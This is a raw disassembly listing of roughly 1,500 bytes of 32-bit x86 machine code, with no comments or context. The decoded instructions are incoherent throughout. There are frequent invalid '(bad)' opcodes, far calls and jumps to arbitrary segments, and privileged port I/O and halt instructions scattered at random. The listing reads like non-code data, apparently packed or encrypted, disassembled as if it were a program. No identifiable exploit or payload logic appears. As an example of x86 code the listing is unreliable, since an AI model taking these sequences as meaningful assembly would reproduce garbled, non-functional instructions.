  40fe6a:	mov    al,ds:0xfc5226e2
  40fe6f:	fxch   st(2)
  40fe71:	mov    ebx,0xb3ca21ea
  40fe76:	jmp    0x40fe87
  40fe78:	cli    
  40fe79:	aad    0xe1
  40fe7b:	xchg   DWORD PTR [ebp+0x6b5e2db3],esi
  40fe81:	sbb    DWORD PTR [ebx+0x14],ebx
  40fe84:	fdiv   QWORD PTR [ecx]
  40fe86:	or     DWORD PTR ss:[ecx-0x3],0x4f
  40fe8b:	cmp    BYTE PTR [ebx],cl
  40fe8d:	and    eax,0xbd3837d4
  40fe92:	inc    ebx
  40fe93:	jl     0x40fe56
  40fe95:	mov    cl,0x84
  40fe97:	adc    al,0xf7
  40fe99:	faddp  st(6),st
  40fe9b:	xchg   ebp,eax
  40fe9c:	rcr    DWORD PTR [ecx-0x100e9398],1
  40fea2:	jbe    0x40ff0e
  40fea4:	adc    DWORD PTR [ebp+0x5fc6c22a],ebp
  40feaa:	jmp    0x7df85894
  40feaf:	sub    bl,BYTE PTR [edx+0x7e]
  40feb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb3:	es cmp esp,ebp
  40feb6:	das    
  40feb7:	mov    esi,eax
  40feb9:	mov    ebx,0xc4415f70
  40febe:	ret    
  40febf:	xlat   BYTE PTR ds:[ebx]
  40fec0:	adc    edx,0x34
  40fec3:	and    al,0x95
  40fec5:	pop    ecx
  40fec6:	push   cs
  40fec7:	mov    al,0x11
  40fec9:	adc    ecx,DWORD PTR [ecx-0x4b3e9eca]
  40fecf:	out    dx,al
  40fed0:	ins    BYTE PTR es:[edi],dx
  40fed1:	sti    
  40fed2:	pop    eax
  40fed3:	and    BYTE PTR [eax],bl
  40fed5:	ins    DWORD PTR es:[edi],dx
  40fed6:	mov    dl,0xe3
  40fed8:	rcr    DWORD PTR [eax-0x4b12f9e7],0x4b
  40fedf:	fbstp  TBYTE PTR [edi-0x45a62e2e]
  40fee5:	mov    ds:0xb8f85985,eax
  40feea:	lahf   
  40feeb:	adc    al,0x41
  40feed:	or     BYTE PTR [ebp-0x17],0xc3
  40fef1:	jecxz  0x40ff5c
  40fef3:	xor    BYTE PTR [eax-0x77c8af8],ch
  40fef9:	leave  
  40fefa:	rcl    DWORD PTR [edx+eiz*8+0x13],cl
  40fefe:	imul   ecx,DWORD PTR [edx+ecx*4-0xf],0xbe7b3b14
  40ff06:	enter  0xb366,0xd7
  40ff0a:	test   al,0xbb
  40ff0c:	adc    eax,DWORD PTR [ecx+0x60]
  40ff0f:	push   esi
  40ff10:	out    0xc4,al
  40ff12:	shl    cl,0x0
  40ff15:	pop    ebx
  40ff16:	call   0x4b28:0xb17caf9d
  40ff1d:	in     al,dx
  40ff1e:	inc    sp
  40ff20:	outs   dx,DWORD PTR ds:[esi]
  40ff21:	mov    dh,0xa1
  40ff23:	sahf   
  40ff24:	pop    es
  40ff25:	dec    esp
  40ff26:	and    BYTE PTR [edx+0x442d3cb3],bh
  40ff2c:	aam    0x4d
  40ff2e:	ss iret 
  40ff30:	test   DWORD PTR [edi+0x28848529],esi
  40ff36:	add    bh,BYTE PTR [ecx]
  40ff38:	xor    DWORD PTR [esi+0x7e],edi
  40ff3b:	sahf   
  40ff3c:	mov    dl,0xd6
  40ff3e:	push   0x7f
  40ff40:	das    
  40ff41:	leave  
  40ff42:	jg     0x40fee4
  40ff44:	jge    0x40ff23
  40ff46:	frstpm(287 only) 
  40ff48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff49:	fcom   st(5)
  40ff4b:	jl     0x40ff1c
  40ff4d:	sub    dh,al
  40ff4f:	push   eax
  40ff50:	hlt    
  40ff51:	push   ebp
  40ff52:	push   ebp
  40ff53:	dec    ebx
  40ff54:	pop    es
  40ff55:	aas    
  40ff56:	jmp    0xd44d9408
  40ff5b:	adc    edi,DWORD PTR [edi+0x4c]
  40ff5e:	pop    edx
  40ff5f:	retf   0x6fdf
  40ff62:	jo     0x40ff54
  40ff64:	stos   BYTE PTR es:[edi],al
  40ff65:	mov    DWORD PTR [eax-0x2446371],eax
  40ff6b:	sub    eax,0x63ebcf0d
  40ff70:	loope  0x40ffc0
  40ff72:	ret    
  40ff73:	and    eax,0x6a011c8f
  40ff78:	ins    BYTE PTR es:[edi],dx
  40ff79:	stc    
  40ff7a:	dec    ebp
  40ff7b:	loop   0x40ff23
  40ff7d:	ins    BYTE PTR es:[edi],dx
  40ff7e:	jae    0x40ff86
  40ff80:	xor    al,BYTE PTR [ebp+esi*8-0x1b30332a]
  40ff87:	retf   0xc602
  40ff8a:	cli    
  40ff8b:	mov    dh,BYTE PTR [eax]
  40ff8d:	push   0x36
  40ff8f:	add    DWORD PTR [eax],ecx
  40ff91:	addr16 pop es
  40ff93:	popa   
  40ff94:	iret   
  40ff95:	push   esi
  40ff96:	push   edi
  40ff97:	pop    ebp
  40ff98:	int    0x5a
  40ff9a:	adc    DWORD PTR [esi-0x5d],edi
  40ff9d:	clc    
  40ff9e:	sbb    BYTE PTR [edx],al
  40ffa0:	div    BYTE PTR [esp+ebx*8]
  40ffa3:	mov    ds:0xea89b9b4,al
  40ffa8:	pop    es
  40ffa9:	scas   al,BYTE PTR es:[edi]
  40ffaa:	xchg   ecx,esi
  40ffac:	mov    eax,ds:0x3c363b95
  40ffb1:	test   al,0x53
  40ffb3:	les    ebp,FWORD PTR [edi+0x50]
  40ffb6:	rcl    DWORD PTR [edi+0x25c5cb56],0x6f
  40ffbd:	jno    0x40ff72
  40ffbf:	fnstsw WORD PTR [ecx-0x7eaadd21]
  40ffc5:	adc    BYTE PTR [eax-0x50],cl
  40ffc8:	fnsave [esi]
  40ffca:	clc    
  40ffcb:	xchg   BYTE PTR [esp+ecx*4+0x5ff61986],cl
  40ffd2:	add    al,0x73
  40ffd4:	lock sub al,0x2b
  40ffd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffd8:	lds    esp,FWORD PTR [ebx]
  40ffda:	inc    esi
  40ffdb:	neg    BYTE PTR [edx+0x1f128b9e]
  40ffe1:	(bad)  
  40ffe2:	sub    ebp,esi
  40ffe4:	cmp    eax,0x62fe7f42
  40ffe9:	pop    edx
  40ffea:	out    0x55,eax
  40ffec:	stos   BYTE PTR es:[edi],al
  40ffed:	dec    esi
  40ffee:	scas   eax,DWORD PTR es:[edi]
  40ffef:	fcomp  DWORD PTR [esi-0x5d]
  40fff2:	lahf   
  40fff3:	(bad)  
  40fff4:	xchg   esp,eax
  40fff5:	inc    BYTE PTR [ebp-0x7c40c26e]
  40fffb:	test   al,0xab
  40fffd:	jmp    0x3aaa213c
  410002:	inc    edi
  410003:	jge    0x40ffaa
  410005:	mov    ecx,0x735438f0
  41000a:	or     eax,0x902ecb0
  41000f:	cmp    dh,BYTE PTR [ecx]
  410011:	mov    eax,0x75403dca
  410016:	ficomp DWORD PTR [edx+0xda0b587]
  41001c:	push   0xffffffed
  41001e:	fnstsw WORD PTR [esi]
  410020:	(bad)  
  410021:	mov    edx,0x659fb64b
  410026:	or     al,0x9f
  410028:	jae    0x40ffd0
  41002a:	pop    ebp
  41002b:	pop    esi
  41002c:	and    bl,cl
  41002e:	das    
  41002f:	push   0x28
  410031:	pop    ss
  410032:	mov    dh,0xa8
  410034:	mov    ebx,0x6dac91f0
  410039:	pop    esi
  41003a:	lds    esi,FWORD PTR [edi+0x33bdbfbe]
  410040:	mov    esp,0x60dafd42
  410045:	int    0x6c
  410047:	loopne 0x410001
  410049:	bound  ebp,QWORD PTR [eax-0x30044330]
  41004f:	mov    eax,0xb05c4f42
  410054:	or     ebx,DWORD PTR [esi]
  410056:	in     al,0xbd
  410058:	in     eax,dx
  410059:	mov    al,ds:0xf954f359
  41005e:	sub    BYTE PTR [eax-0x74],al
  410061:	ds daa 
  410063:	jo     0x41006b
  410065:	or     BYTE PTR [edx+0x6a],0x12
  410069:	or     al,0xc6
  41006b:	cmp    BYTE PTR [ebp-0x3142cd92],cl
  410071:	imul   edi,edi,0xffffff92
  410074:	scas   al,BYTE PTR es:[edi]
  410075:	dec    esp
  410076:	das    
  410077:	mov    eax,0xe7200f48
  41007c:	lods   al,BYTE PTR ds:[esi]
  41007d:	inc    edx
  41007e:	stc    
  41007f:	sub    al,BYTE PTR [edi+0x510fb981]
  410085:	and    BYTE PTR [edi+0x23],bl
  410088:	hlt    
  410089:	fimul  DWORD PTR [edx-0x50acf760]
  41008f:	les    ecx,FWORD PTR [ebx+0x7e]
  410092:	hlt    
  410093:	fsub   DWORD PTR [ebx+0x774b052c]
  410099:	jl     0x4100e1
  41009b:	mul    DWORD PTR [esi+eiz*4-0x5]
  41009f:	and    eax,0x54e47630
  4100a4:	cmp    al,0xc3
  4100a6:	cmp    eax,0x977508bf
  4100ab:	xchg   ebx,eax
  4100ac:	stos   BYTE PTR es:[edi],al
  4100ad:	jp     0x41009c
  4100af:	imul   edx,DWORD PTR [ecx],0x417160e7
  4100b5:	(bad)  
  4100b6:	int3   
  4100b7:	push   ebx
  4100b8:	sbb    ecx,esi
  4100ba:	mov    eax,DWORD PTR [esi]
  4100bc:	push   ds
  4100bd:	inc    esp
  4100be:	stc    
  4100bf:	in     eax,0x0
  4100c1:	aaa    
  4100c2:	inc    esp
  4100c3:	cs iret 
  4100c5:	(bad)  
  4100c7:	cmc    
  4100c8:	adc    eax,DWORD PTR [edi+0x26]
  4100cb:	add    bh,BYTE PTR [ecx+edx*1+0x3b]
  4100cf:	xor    BYTE PTR [ebx],ah
  4100d1:	push   edi
  4100d2:	push   es
  4100d3:	add    BYTE PTR [edi+0x7235e66e],al
  4100d9:	(bad)  
  4100da:	nop
  4100db:	into   
  4100dc:	sbb    al,0x88
  4100de:	sub    al,0xe9
  4100e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e1:	cmp    al,0xf0
  4100e3:	adc    ah,0xe4
  4100e6:	loopne 0x410161
  4100e8:	and    BYTE PTR [edx-0x77eda497],0x8a
  4100ef:	lods   eax,DWORD PTR ds:[esi]
  4100f0:	ins    DWORD PTR es:[edi],dx
  4100f1:	das    
  4100f2:	lahf   
  4100f3:	clc    
  4100f4:	jo     0x41011f
  4100f6:	xchg   edx,eax
  4100f7:	mov    al,ds:0x5e797189
  4100fc:	fnsave [edx-0x54]
  4100ff:	jecxz  0x4100b4
  410101:	std    
  410102:	inc    esp
  410103:	pop    ebx
  410104:	mov    al,ds:0xa236d1d0
  410109:	sbb    al,0x77
  41010b:	push   eax
  41010c:	test   eax,0x15b0cae8
  410111:	or     al,0xc0
  410113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410114:	sbb    al,0xc9
  410116:	ins    BYTE PTR es:[edi],dx
  410117:	fcomp  DWORD PTR [ebx+0x6b]
  41011a:	arpl   WORD PTR [esi-0x1985c9d9],di
  410120:	xchg   edi,eax
  410121:	add    DWORD PTR [edx+0x26def722],ecx
  410127:	xor    BYTE PTR [edi+0x65c70754],ch
  41012d:	pop    edi
  41012e:	mov    eax,gs:0x5359b05e
  410134:	fdivr  st,st(6)
  410136:	jae    0x410182
  410138:	lods   eax,DWORD PTR ds:[esi]
  410139:	mov    edi,0x8f4ba496
  41013e:	inc    esp
  41013f:	mov    dl,0xab
  410141:	js     0x410142
  410143:	mov    ebx,ebp
  410145:	lods   al,BYTE PTR ds:[esi]
  410146:	out    dx,al
  410147:	push   cs
  410148:	xor    bh,BYTE PTR [edx+edi*4]
  41014b:	mov    dh,dh
  41014d:	cmp    eax,0x2e6f7c5b
  410152:	push   cs
  410153:	mov    BYTE PTR [esi+eiz*2],bh
  410156:	js     0x41015d
  410158:	cmp    esp,DWORD PTR [edi+0x39]
  41015b:	dec    esi
  41015c:	xor    eax,0xaf7e588c
  410161:	cmp    BYTE PTR [ebp-0x50],bh
  410164:	dec    ebx
  410165:	xchg   BYTE PTR [ecx-0x10461435],bh
  41016b:	xchg   DWORD PTR [ebx-0x3fda88ab],esp
  410171:	inc    edi
  410172:	clc    
  410173:	enter  0xbed1,0x73
  410177:	ins    DWORD PTR es:[edi],dx
  410178:	mov    edi,ds
  41017a:	pushf  
  41017b:	out    dx,eax
  41017c:	imul   ebx,DWORD PTR [edi+0x24de435],0x5faf0f6e
  410186:	loop   0x41017c
  410188:	push   ss
  410189:	aad    0x66
  41018b:	push   ss
  41018c:	test   al,0x12
  41018e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018f:	(bad)  
  410190:	pushf  
  410191:	or     BYTE PTR [ecx-0x601895b],dh
  410197:	jnp    0x4101bf
  410199:	cli    
  41019a:	add    eax,0x26b159d7
  41019f:	ds stos BYTE PTR es:[edi],al
  4101a1:	mov    al,0x2f
  4101a3:	push   0xffffff9b
  4101a5:	enter  0xbac9,0x9e
  4101a9:	dec    esi
  4101aa:	ret    
  4101ab:	xor    ebx,DWORD PTR [esi]
  4101ad:	dec    edx
  4101ae:	call   0x5daa:0x37687aa0
  4101b5:	push   0x7e7c8178
  4101ba:	jae    0x41019c
  4101bc:	pop    es
  4101bd:	call   0xde7c:0xc7df195c
  4101c4:	(bad)  
  4101c5:	sbb    eax,0x1678070
  4101ca:	inc    esp
  4101cb:	add    al,0x92
  4101cd:	jp     0x4101ed
  4101cf:	cld    
  4101d0:	out    0xdc,eax
  4101d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101d3:	mov    WORD PTR [edi+0x64],cs
  4101d6:	inc    ebx
  4101d7:	lods   al,BYTE PTR ds:[esi]
  4101d8:	ret    0x6cc0
  4101db:	stos   DWORD PTR es:[edi],eax
  4101dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101dd:	dec    edi
  4101de:	ret    0x3381
  4101e1:	test   eax,0x742be684
  4101e6:	out    0x93,al
  4101e8:	adc    ch,dl
  4101ea:	pop    ds
  4101eb:	(bad)  
  4101ec:	xchg   edi,eax
  4101ed:	cmp    eax,0x6d342400
  4101f2:	pop    esp
  4101f3:	fs and eax,0x1749cc72
  4101f9:	cmp    al,0x73
  4101fb:	pop    es
  4101fc:	(bad)  
  4101fd:	mov    dl,0x53
  4101ff:	mov    BYTE PTR [eax],dh
  410201:	mov    al,0x74
  410203:	jns    0x41027b
  410205:	mov    edi,0xb9bb6765
  41020a:	cli    
  41020b:	xchg   ebp,eax
  41020c:	sbb    DWORD PTR [esi+ebp*2+0xf],eax
  410210:	or     DWORD PTR [esi+0x9819f52],0x35
  410217:	or     dl,BYTE PTR [edi+0x7e17a3c2]
  41021d:	jp     0x4101d6
  41021f:	adc    al,0x84
  410221:	pop    ss
  410222:	outs   dx,BYTE PTR ds:[esi]
  410223:	sbb    eax,0xcb9a272f
  410228:	iret   
  410229:	in     al,dx
  41022a:	cdq    
  41022b:	mov    edx,0x2da4708a
  410230:	sub    ebx,ebx
  410232:	mov    cl,0x6e
  410234:	mov    ds:0x9b763e91,al
  410239:	retf   0x50cd
  41023c:	mov    gs,WORD PTR [eax+0x1d]
  41023f:	push   eax
  410240:	jno    0xcbf5941c
  410246:	fdiv   DWORD PTR [ecx+0x51]
  410249:	cld    
  41024a:	sbb    al,0xd7
  41024c:	(bad)  
  41024d:	js     0x410244
  41024f:	retf   
  410250:	outs   dx,DWORD PTR ds:[esi]
  410251:	aas    
  410252:	jno    0x410247
  410254:	ins    DWORD PTR es:[edi],dx
  410255:	xor    DWORD PTR [ecx],edi
  410257:	(bad)  
  410258:	int    0xbb
  41025a:	fs loope 0x4102c9
  41025d:	pop    ebx
  41025e:	in     al,dx
  41025f:	in     al,dx
  410260:	(bad)  
  410261:	sbb    eax,0xb4e744a
  410266:	jmp    0xabe9d5b4
  41026b:	fist   WORD PTR [edx]
  41026d:	(bad)  
  41026e:	scas   al,BYTE PTR es:[edi]
  41026f:	mov    al,ds:0xf852bf41
  410274:	sub    al,0x34
  410276:	aaa    
  410277:	and    eax,DWORD PTR [ecx+0x3c61a0aa]
  41027d:	outs   dx,DWORD PTR ss:[esi]
  41027f:	pop    esp
  410280:	stc    
  410281:	das    
  410282:	ret    
  410283:	pop    esp
  410284:	(bad)  
  410285:	adc    eax,0x411d1eac
  41028a:	lock fs dec ecx
  41028d:	or     ebx,DWORD PTR [edi]
  41028f:	sub    dl,BYTE PTR [esi+0x21]
  410292:	or     esi,DWORD PTR ds:0xa6d3eccc
  410298:	adc    al,0xc4
  41029a:	daa    
  41029b:	push   ebp
  41029c:	dec    ebp
  41029d:	jne    0x4102f5
  41029f:	or     BYTE PTR [ebx-0x2a],cl
  4102a2:	push   esp
  4102a3:	xor    DWORD PTR [ebx+0x137069e7],0x283b3f61
  4102ad:	dec    ebx
  4102ae:	out    0x1d,eax
  4102b0:	cwde   
  4102b1:	pop    esp
  4102b2:	pop    es
  4102b3:	push   esp
  4102b4:	mov    esp,0x5461bfc9
  4102b9:	fwait
  4102ba:	nop
  4102bb:	push   edx
  4102bc:	push   0xffffffa1
  4102be:	or     edi,esp
  4102c0:	shl    edx,1
  4102c2:	add    BYTE PTR [esp+edi*8-0x2675169f],ah
  4102c9:	sbb    eax,DWORD PTR [esi+0xaaf35c9]
  4102cf:	jmp    0x4b788b9a
  4102d4:	pop    ebx
  4102d6:	cmp    BYTE PTR [ebp+edi*4-0x1c],ch
  4102da:	push   ebx
  4102db:	xchg   esi,eax
  4102dc:	dec    eax
  4102dd:	adc    DWORD PTR [ecx],esp
  4102df:	call   0x241d:0x550fe522
  4102e6:	or     esi,DWORD PTR [eax]
  4102e8:	push   0xffffffd6
  4102ea:	sub    esi,DWORD PTR [eax]
  4102ec:	or     eax,0x969ec4cf
  4102f1:	pop    ebx
  4102f2:	push   esi
  4102f3:	sub    ebp,DWORD PTR [ebx-0x61]
  4102f6:	ret    0x5428
  4102f9:	xchg   ebp,eax
  4102fa:	push   ebp
  4102fb:	(bad)  
  4102fc:	mov    esi,0x5fba52db
  410301:	(bad)  
  410302:	jge    0x410381
  410304:	mov    esi,0xc681be51
  410309:	aam    0xc5
  41030b:	addr16 pop ebp
  41030d:	and    eax,0x2e3912e3
  410312:	dec    ebx
  410313:	add    eax,0xa2a3ba10
  410318:	inc    esi
  410319:	dec    edx
  41031a:	sbb    bh,0xeb
  41031d:	les    esp,FWORD PTR [ecx]
  41031f:	dec    edx
  410320:	das    
  410321:	cmp    al,0x87
  410323:	mov    ds:0x4511e39b,eax
  410328:	pop    eax
  410329:	xlat   BYTE PTR ds:[ebx]
  41032a:	adc    BYTE PTR [ebp+0x14],ch
  41032d:	sub    al,0x1
  41032f:	inc    edi
  410330:	push   0xbd32252c
  410335:	sub    BYTE PTR [ecx+0x46],ch
  410338:	xchg   edi,eax
  410339:	rol    BYTE PTR [ebx+0x6d],0xdd
  41033d:	adc    bh,BYTE PTR [eax+ebx*2-0x18cebe92]
  410344:	fisub  WORD PTR [edi-0x7c]
  410347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410348:	leave  
  410349:	xchg   esi,eax
  41034a:	mov    al,ds:0xf952b0fb
  41034f:	pop    ss
  410350:	inc    ebp
  410351:	xor    eax,DWORD PTR [ebp-0x29]
  410354:	inc    eax
  410355:	mov    al,0x32
  410357:	mov    ah,BYTE PTR [ecx]
  410359:	add    al,0x12
  41035b:	lea    eax,[edx]
  41035d:	xchg   edi,eax
  41035e:	and    DWORD PTR [eax-0x23],ebp
  410361:	cmc    
  410362:	mov    BYTE PTR ds:0x6b9a996f,ch
  410368:	dec    DWORD PTR [eax-0x70521eef]
  41036e:	mov    eax,0x7f93f331
  410373:	lods   eax,DWORD PTR ds:[esi]
  410374:	(bad)  
  410375:	call   0x2f3b:0xf0b766fa
  41037c:	lds    ebp,FWORD PTR [ecx+esi*1+0xd3a6613]
  410383:	addr16 pop ebx
  410385:	fsubr  DWORD PTR [ebp-0x7f0de63e]
  41038b:	gs pop ds
  41038d:	cmp    al,0xf4
  41038f:	sbb    BYTE PTR [ecx+0x9],ah
  410392:	jl     0x4103eb
  410394:	mov    bh,0x28
  410396:	retf   
  410397:	pop    ss
  410398:	xor    ebp,ecx
  41039a:	or     bh,ah
  41039c:	repnz xchg ebp,eax
  41039e:	xor    al,0xaa
  4103a0:	pop    esi
  4103a1:	inc    edi
  4103a2:	cmp    bl,ch
  4103a4:	sbb    al,0xb4
  4103a6:	out    dx,al
  4103a7:	popf   
  4103a8:	fwait
  4103a9:	inc    esi
  4103aa:	sbb    eax,0x6f91d7e6
  4103af:	shl    DWORD PTR [edx],1
  4103b1:	cmp    bl,dh
  4103b3:	xchg   ebp,eax
  4103b4:	sahf   
  4103b5:	pop    es
  4103b6:	jge    0x410421
  4103b8:	cld    
  4103b9:	cdq    
  4103ba:	in     eax,dx
  4103bb:	sub    al,0xeb
  4103bd:	sahf   
  4103be:	push   cs
  4103bf:	shr    DWORD PTR [ebx+ecx*2+0x19],1
  4103c3:	sti    
  4103c4:	mov    al,ds:0xe3cd25dc
  4103c9:	repnz outs dx,BYTE PTR ds:[esi]
  4103cb:	or     DWORD PTR [edx-0x3c],esi
  4103ce:	es pop eax
  4103d0:	sti    
  4103d1:	push   ebp
  4103d2:	jg     0x4103ec
  4103d4:	mov    ch,0xfa
  4103d6:	ret    0x8d58
  4103d9:	xchg   ecx,eax
  4103da:	add    eax,0xb4194c14
  4103df:	test   eax,0x133a7aa5
  4103e4:	push   ebx
  4103e5:	jne    0x41043b
  4103e7:	je     0x4103a5
  4103e9:	push   eax
  4103ea:	(bad)  
  4103eb:	cmc    
  4103ec:	test   al,0x6a
  4103ee:	xlat   BYTE PTR ds:[ebx]
  4103ef:	xor    bl,0x87
  4103f2:	add    esi,esp
  4103f4:	ins    BYTE PTR es:[edi],dx
  4103f5:	and    DWORD PTR [esp+ecx*1-0x1bb2e002],esi
  4103fc:	mov    eax,ds:0x9846b5f0
  410401:	inc    esp
  410402:	leave  
  410403:	inc    eax
  410404:	mov    ebp,0x6586a789
  410409:	jnp    0x41043a
  41040b:	call   0x7adb445f
  410410:	inc    eax
  410411:	jg     0x410478
  410413:	sub    esp,ecx
  410415:	imul   BYTE PTR [eax]
  410417:	call   0x6b13148f
  41041c:	int3   
  41041d:	and    DWORD PTR [eax-0x1e],edi
  410420:	pushf  
  410421:	inc    DWORD PTR [esi+esi*8]
  410424:	xchg   edx,eax
  410425:	inc    ebx
  410426:	call   0xcd3:0x4490946
  41042d:	xchg   edi,eax
  41042e:	in     eax,0x99
  410430:	retf   
  410431:	pop    edi
  410432:	xchg   ecx,eax
  410433:	pushf  
  410434:	outs   dx,BYTE PTR gs:[esi]
  410436:	or     al,0xa3
  410438:	sub    BYTE PTR [ecx],cl
  41043a:	pop    ebp
  41043b:	add    BYTE PTR [edx+0x51],ah
  41043e:	and    eax,0xa5a5519d
  410443:	xchg   edi,eax
  410444:	aad    0x2f
  410446:	fadd   DWORD PTR [ebp+0x6a]
  410449:	push   0x3
  41044b:	es add esi,eax
  41044e:	push   ss
  41044f:	ds repz scas eax,DWORD PTR es:[edi]
  410452:	and    DWORD PTR [esi+edi*1+0x4f],ecx
  410456:	jo     0x41040b
  410458:	pop    es
  410459:	outs   dx,DWORD PTR ds:[esi]
  41045a:	mov    esp,0xf2481b8c
  41045f:	or     eax,0xe56effa
  410464:	shl    BYTE PTR [ecx-0x312a102f],cl
  41046a:	ret    0xf04c
  41046d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41046e:	sub    al,0x56
  410470:	addr16 dec edi
  410472:	test   DWORD PTR [ebp-0x7c],eax
  410475:	lea    eax,[ecx+0x30f9c26f]
  41047b:	add    edx,DWORD PTR [eax-0x3ff09c96]
  410481:	sub    ah,BYTE PTR [esi+ebp*8+0x40195f6f]
  410488:	out    0x3d,eax
  41048a:	xchg   ecx,eax
  41048b:	dec    edx
  41048c:	aam    0x92
  41048e:	mov    ecx,0x59f89228
  410493:	js     0x410426
  410495:	nop
  410496:	push   esi
  410497:	jb     0x4104ba
  410499:	in     al,dx
  41049a:	mov    edx,0xea7093bd
  41049f:	call   0xe7eb:0x4578e49d
  4104a6:	add    ah,bh
  4104a8:	call   0x7362:0xd557495c
  4104af:	adc    DWORD PTR [ebx-0x4b54699f],eax
  4104b5:	bnd jns 0x4104cc
  4104b8:	xchg   ebx,eax
  4104b9:	jp     0x410456
  4104bb:	fs push es
  4104bd:	mov    edx,0xa37bd588
  4104c2:	loopne 0x4104ff
  4104c4:	fild   QWORD PTR [edi]
  4104c6:	mov    ah,BYTE PTR ds:[ecx+0xf2ad177]
  4104cd:	mov    ds:0xc915ca99,al
  4104d2:	and    bh,al
  4104d4:	retf   0x7e6f
  4104d7:	mov    dh,bl
  4104d9:	cmc    
  4104da:	loopne 0x4104f7
  4104dc:	mov    BYTE PTR [eax],ch
  4104de:	xchg   ebp,eax
  4104df:	pop    ss
  4104e0:	xor    al,0xac
  4104e2:	imul   esp,DWORD PTR [edx],0xc391b71
  4104e8:	jmp    0x76c60304
  4104ed:	mov    al,0x7d
  4104ef:	ds pop edi
  4104f1:	psubsb mm0,mm2
  4104f4:	stos   DWORD PTR es:[edi],eax
  4104f5:	add    edi,DWORD PTR [ecx+ebx*2-0x2d696249]
  4104fc:	add    dl,BYTE PTR [eax+0x2646aa7f]
  410502:	rcr    BYTE PTR [ebp-0x7047cfeb],0x69
  410509:	leave  
  41050a:	and    BYTE PTR [ebx+0x1e3a4360],bh
  410510:	ja     0x4104ff
  410512:	test   eax,0x5dcaca4f
  410517:	or     eax,0x81dd0d3d
  41051c:	and    dh,cl
  41051e:	(bad)  
  41051f:	mov    esp,DWORD PTR [ecx-0x6bdc8226]
  410525:	mov    ds:0x4c843820,al
  41052a:	aam    0xe6
  41052c:	fadd   DWORD PTR [ebx+0x3e5d8b8f]
  410532:	pop    ss
  410533:	test   DWORD PTR [esi-0x7a4c09a5],edi
  410539:	rcr    DWORD PTR [edx],0x1e
  41053c:	dec    edi
  41053d:	xor    BYTE PTR [ecx-0x6ed61b92],0x47
  410544:	and    BYTE PTR [ebx+0x8858e42],dl
  41054a:	(bad)  
  41054b:	xor    al,0x1b
  41054d:	fs inc eax
  41054f:	cmp    DWORD PTR [edx-0x33853abe],esp
  410555:	inc    edx
  410556:	mov    ds:0x47d57c9a,al
  41055b:	ret    
  41055c:	cwde   
  41055d:	rol    bl,1
  41055f:	das    
  410560:	jl     0x410591
  410562:	or     eax,0x2ddc56dd
  410567:	pop    ecx
  410568:	clc    
  410569:	mov    ds:0x4d885c10,al
  41056e:	lahf   
  41056f:	mov    bh,0x4
  410571:	xchg   DWORD PTR [ecx-0x5cbfc424],ecx
  410577:	mov    ds:0x38749973,al
  41057c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41057d:	or     al,0x56
  41057f:	inc    edx
  410580:	push   cs
  410581:	jbe    0x4105b8
  410583:	add    al,0xe
  410585:	into   
  410586:	adc    al,0xe6
  410588:	in     al,0x91
  41058a:	(bad)  
  41058c:	or     DWORD PTR [eiz*1-0x14b5b33e],0xd8ea191b
  410597:	add    eax,0x143125c8
  41059c:	(bad)  
  41059d:	out    0x5c,al
  41059f:	cmp    cl,BYTE PTR [esi+eax*1+0x52285698]
  4105a6:	xchg   ebx,eax
  4105a7:	mov    esi,0xd3331af3
  4105ac:	aam    0x78
  4105ae:	cmp    BYTE PTR [ecx+edx*2-0x7b],dh
  4105b2:	add    BYTE PTR [edi],0x76
  4105b5:	or     eax,0x3a82eb1
  4105ba:	and    al,0x6f
  4105bc:	lds    ebp,FWORD PTR [edx]
  4105be:	jns    0x4105d5
  4105c0:	mov    bh,0xdf
  4105c2:	popa   
  4105c3:	icebp  
  4105c4:	retf   
  4105c5:	push   cs
  4105c6:	dec    ebp
  4105c7:	aad    0x0
  4105c9:	jns    0x41062e
  4105cb:	shr    DWORD PTR [ebp+0x22556061],1
  4105d1:	jecxz  0x41063a
  4105d3:	add    DWORD PTR [esp+edx*2+0x59f91add],0xffffff82
  4105db:	jno    0x4105af
  4105dd:	pop    esp
  4105de:	dec    edi
  4105df:	xor    al,0x77
  4105e1:	xor    dl,BYTE PTR [edx+eiz*4+0x305d6bc7]
  4105e8:	mov    ebp,edx
  4105ea:	out    dx,eax
  4105eb:	imul   edi,DWORD PTR [ecx],0xc57e9725
  4105f1:	(bad)
  4105f5:	shr    dl,1
  4105f7:	popa   
  4105f8:	dec    esp
  4105f9:	cmp    eax,DWORD PTR [ebx]
  4105fb:	mov    ds:0x1a6aa143,al
  410600:	cli    
  410601:	fstp   QWORD PTR [edi+ebx*4+0x52]
  410605:	fsub   QWORD PTR [esi]
  410607:	sbb    BYTE PTR [ecx-0x7a],al
  41060a:	dec    eax
  41060b:	cmp    ah,BYTE PTR [esi+0x5b53703f]
  410611:	xor    al,0xe2
  410613:	sub    ecx,ebx
  410615:	stc    
  410616:	je     0x4105c8
  410618:	sub    al,0x34
  41061a:	adc    esi,DWORD PTR [eax]
  41061c:	mov    bh,0x82
  41061e:	jnp    0x410694
  410620:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410621:	popf   
  410622:	mov    dl,0x4
  410624:	jnp    0x4105ab
  410626:	fprem  
  410628:	jnp    0x410631
  41062a:	push   0x30740a90
  41062f:	rol    DWORD PTR [eax],0x35
  410632:	push   cs
  410633:	gs jne 0x410615
  410636:	dec    ebx
  410637:	push   edi
  410638:	into   
  410639:	inc    DWORD PTR [ecx-0x48c101df]
  41063f:	dec    ebx
  410640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410641:	adc    edi,DWORD PTR [ebp-0x393c810c]
  410647:	sbb    eax,0x9214b038
  41064c:	push   cs
  41064d:	iret   
  41064e:	xor    dl,bl
  410650:	leave  
  410651:	(bad)  
  410652:	pop    ds
  410653:	pop    esp
  410654:	aad    0xa5
